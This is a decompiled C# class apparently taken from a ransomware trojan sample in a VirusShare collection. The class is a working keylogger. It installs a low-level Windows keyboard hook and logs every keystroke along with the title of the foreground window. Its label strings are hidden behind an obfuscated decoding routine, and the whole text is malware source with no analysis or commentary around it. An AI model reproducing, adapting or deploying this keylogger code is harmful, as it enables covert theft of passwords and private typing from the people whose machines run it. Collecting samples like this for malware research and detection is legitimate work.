// Decompiled with JetBrains decompiler
// Type: WNKBHEQY
// Assembly: 222222, Version=7.75.26.79, Culture=neutral, PublicKeyToken=null
// MVID: 4BBEBC6C-8846-4FD8-8CBA-F3F42BFE498C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxnf-86627272f15f9986eda96f2b9cf928cf060c453bafd8c484fce237fd3ff62a0a.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

public class WNKBHEQY
{
  private string output;
  private static IntPtr JKJQFLEY = (IntPtr) 0;
  private static string HCUSHTVY = "";
  private static WNKBHEQY.KeyboardHookDelegate YTKTOLCB = (WNKBHEQY.KeyboardHookDelegate) null;

  public static string NJNKHCQJ(IntPtr hWnd)
  {
    string str;
    try
    {
      if (hWnd.ToInt32() <= 0)
      {
        str = (string) null;
      }
      else
      {
        int windowTextLength = WNKBHEQY.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
        {
          str = (string) null;
        }
        else
        {
          StringBuilder lpString = new StringBuilder(checked (windowTextLength + 1));
          WNKBHEQY.GetWindowText((int) hWnd, lpString, lpString.Capacity);
          str = lpString.ToString().Trim();
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static bool OWLPKCDE()
  {
    bool flag;
    try
    {
      flag = WNKBHEQY.JKJQFLEY != (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static void IGWEOPPR()
  {
    try
    {
      WNKBHEQY.YTKTOLCB = new WNKBHEQY.KeyboardHookDelegate(WNKBHEQY.KYBRDLCK);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      WNKBHEQY.JKJQFLEY = (IntPtr) WNKBHEQY.SetWindowsHookEx(13, WNKBHEQY.YTKTOLCB, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  public static void HMWXNWOL()
  {
    try
    {
      if (!WNKBHEQY.OWLPKCDE() || WNKBHEQY.UnhookWindowsHookEx((int) WNKBHEQY.JKJQFLEY) == 0)
        return;
      WNKBHEQY.JKJQFLEY = (IntPtr) 0;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetAsyncKeyState(int vKey);

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    WNKBHEQY.KeyboardHookDelegate lpfn,
    int hmod,
    int dwThreadId);

  public static int KYBRDLCK(int Code, int WPA, ref WNKBHEQY.ETHECRVN LPA)
  {
    try
    {
      string Left = WNKBHEQY.NJNKHCQJ(WNKBHEQY.GetForegroundWindow());
      if (Operators.CompareString(Left, WNKBHEQY.HCUSHTVY, false) != 0)
      {
        WNKBHEQY.HCUSHTVY = Left;
        UGMVUKMJ.WMGVCEYV = UGMVUKMJ.WMGVCEYV + Environment.NewLine + UYGQQYLC.WEGPJNXO("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + " " + Left + " " + UYGQQYLC.WEGPJNXO("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Thread.Sleep(10);
      string str = "";
      if (WPA == 256 | WPA == 260)
      {
        switch (LPA.UYNCQIHR)
        {
          case 8:
            UGMVUKMJ.WMGVCEYV = UGMVUKMJ.WMGVCEYV.Substring(0, checked (UGMVUKMJ.WMGVCEYV.Length - 1));
            break;
          case 9:
            str = char.ConvertFromUtf32(9);
            break;
          case 13:
            str = Environment.NewLine;
            break;
          case 16:
          case 160:
          case 161:
            str = "";
            break;
          case 18:
            str = UYGQQYLC.WEGPJNXO("W7Gi1M6Ydg0=", "False");
            break;
          case 20:
            str = !Control.IsKeyLocked(Keys.Capital) ? UYGQQYLC.WEGPJNXO("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : UYGQQYLC.WEGPJNXO("QpiLkJF1XZSehG1dl5WHf10m", "False");
            break;
          case 27:
            str = UYGQQYLC.WEGPJNXO("S6GWy62IZh0=", "False");
            break;
          case 32:
            str = UYGQQYLC.WEGPJNXO("RyA=", "False");
            break;
          case 33:
            str = UYGQQYLC.WEGPJNXO("Zbu708uqtdvPhAE=", "False");
            break;
          case 34:
            str = UYGQQYLC.WEGPJNXO("VKqqwrqZk8nYwZFvFA==", "False");
            break;
          case 35:
            str = UYGQQYLC.WEGPJNXO("R52SwqqEYiE=", "False");
            break;
          case 36:
            str = UYGQQYLC.WEGPJNXO("WrCo1safsoAP", "False");
            break;
          case 37:
            str = UYGQQYLC.WEGPJNXO("U6mVvXIT", "False");
            break;
          case 38:
            str = UYGQQYLC.WEGPJNXO("SJ6ssmce", "False");
            break;
          case 39:
            str = UYGQQYLC.WEGPJNXO("X7WjyX4H", "False");
            break;
          case 40:
            str = UYGQQYLC.WEGPJNXO("O5GXpVor", "False");
            break;
          case 46:
            str = UYGQQYLC.WEGPJNXO("WrCkzMWXdQ4=", "False");
            break;
          case 48:
          case 49:
          case 50:
          case 51:
          case 52:
          case 53:
          case 54:
          case 55:
          case 56:
          case 57:
            if (MyProject.Computer.Keyboard.ShiftKeyDown)
            {
              string[] strArray = UYGQQYLC.WEGPJNXO("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False").Split(Conversions.ToChar(UYGQQYLC.WEGPJNXO("VBM=", "False")));
              switch (LPA.UYNCQIHR)
              {
                case 48:
                  str = strArray[9];
                  break;
                case 49:
                  str = strArray[0];
                  break;
                case 50:
                  str = strArray[1];
                  break;
                case 51:
                  str = strArray[2];
                  break;
                case 52:
                  str = strArray[3];
                  break;
                case 53:
                  str = strArray[4];
                  break;
                case 54:
                  str = strArray[5];
                  break;
                case 55:
                  str = strArray[6];
                  break;
                case 56:
                  str = strArray[7];
                  break;
                case 57:
                  str = strArray[8];
                  break;
              }
            }
            else
            {
              str = char.ConvertFromUtf32(LPA.UYNCQIHR);
              break;
            }
            break;
          case 65:
          case 66:
          case 67:
          case 68:
          case 69:
          case 70:
          case 71:
          case 72:
          case 73:
          case 74:
          case 75:
          case 76:
          case 77:
          case 78:
          case 79:
          case 80:
          case 81:
          case 82:
          case 83:
          case 84:
          case 85:
          case 86:
          case 87:
          case 88:
          case 89:
          case 90:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? char.ConvertFromUtf32(checked (LPA.UYNCQIHR + 32)).ToLower() : char.ConvertFromUtf32(checked (LPA.UYNCQIHR + 32)).ToUpper();
            break;
          case 91:
          case 92:
            str = UYGQQYLC.WEGPJNXO("Q5mgubBls73EsZGbaSY=", "False");
            break;
          case 96:
            str = UYGQQYLC.WEGPJNXO("dQI=", "False");
            break;
          case 97:
            str = UYGQQYLC.WEGPJNXO("Wx0=", "False");
            break;
          case 98:
            str = UYGQQYLC.WEGPJNXO("ZhM=", "False");
            break;
          case 99:
            str = UYGQQYLC.WEGPJNXO("SjA=", "False");
            break;
          case 100:
            str = UYGQQYLC.WEGPJNXO("TC8=", "False");
            break;
          case 101:
            str = UYGQQYLC.WEGPJNXO("VCg=", "False");
            break;
          case 102:
            str = UYGQQYLC.WEGPJNXO("WyI=", "False");
            break;
          case 103:
            str = UYGQQYLC.WEGPJNXO("dQk=", "False");
            break;
          case 104:
            str = UYGQQYLC.WEGPJNXO("Vyg=", "False");
            break;
          case 105:
            str = UYGQQYLC.WEGPJNXO("dwk=", "False");
            break;
          case 112:
          case 113:
          case 114:
          case 115:
          case 116:
          case 117:
          case 118:
          case 119:
          case 120:
          case 121:
          case 122:
          case 123:
          case 124:
          case 125:
          case 126:
          case (int) sbyte.MaxValue:
          case 128:
          case 129:
          case 130:
          case 131:
          case 132:
          case 133:
          case 134:
          case 135:
            str = UYGQQYLC.WEGPJNXO("UaedGA==", "False") + Conversions.ToString(checked (LPA.UYNCQIHR - 111)) + UYGQQYLC.WEGPJNXO("o4EC", "False");
            break;
          case 144:
            str = !MyProject.Computer.Keyboard.NumLock ? UYGQQYLC.WEGPJNXO("ZLq45tCQzs3cg5PNx5EG", "False") : UYGQQYLC.WEGPJNXO("SZ+dy7V1s7LBaHiqtbNoHQ==", "False");
            break;
          case 162:
          case 163:
            str = UYGQQYLC.WEGPJNXO("Vaue0cKpwsrOsVUS", "False");
            break;
          case 164:
          case 165:
            str = UYGQQYLC.WEGPJNXO("RJqLvbeBXyQ=", "False");
            break;
          case 186:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("cBI=", "False") : UYGQQYLC.WEGPJNXO("axY=", "False");
            break;
          case 187:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("WSs=", "False") : UYGQQYLC.WEGPJNXO("bAY=", "False");
            break;
          case 188:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("YhE=", "False") : UYGQQYLC.WEGPJNXO("XCc=", "False");
            break;
          case 189:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("cAQ=", "False") : UYGQQYLC.WEGPJNXO("eC4=", "False");
            break;
          case 190:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("ZRA=", "False") : UYGQQYLC.WEGPJNXO("bRg=", "False");
            break;
          case 191:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("aQ0=", "False") : UYGQQYLC.WEGPJNXO("gQU=", "False");
            break;
          case 192:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("lBM=", "False") : UYGQQYLC.WEGPJNXO("vQg=", "False");
            break;
          case 219:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("mgg=", "False") : UYGQQYLC.WEGPJNXO("wAI=", "False");
            break;
          case 220:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("czA=", "False") : UYGQQYLC.WEGPJNXO("vwQ=", "False");
            break;
          case 221:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("gSM=", "False") : UYGQQYLC.WEGPJNXO("rBg=", "False");
            break;
          case 222:
            str = !MyProject.Computer.Keyboard.ShiftKeyDown ? UYGQQYLC.WEGPJNXO("bQE=", "False") : UYGQQYLC.WEGPJNXO("Ths=", "False");
            break;
          default:
            str = "";
            break;
        }
        UGMVUKMJ.WMGVCEYV += str;
        UGMVUKMJ.SGGILSDL = UGMVUKMJ.WMGVCEYV;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    int num;
    return num;
  }

  [DllImport("user32.dll", SetLastError = true)]
  public static extern IntPtr GetForegroundWindow();

  [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  public static extern int GetWindowTextLength(IntPtr hwnd);

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetWindowText(int hwnd, StringBuilder lpString, int cch);

  public WNKBHEQY(string output)
  {
    try
    {
      this.output = output;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref WNKBHEQY.ETHECRVN lParam);

  public struct ETHECRVN
  {
    public int UYNCQIHR;
    public int KKFWEKPO;
    public int SDIBTXIG;
    public int XFLJIYON;
    public int EWBUSGXM;
  }
}
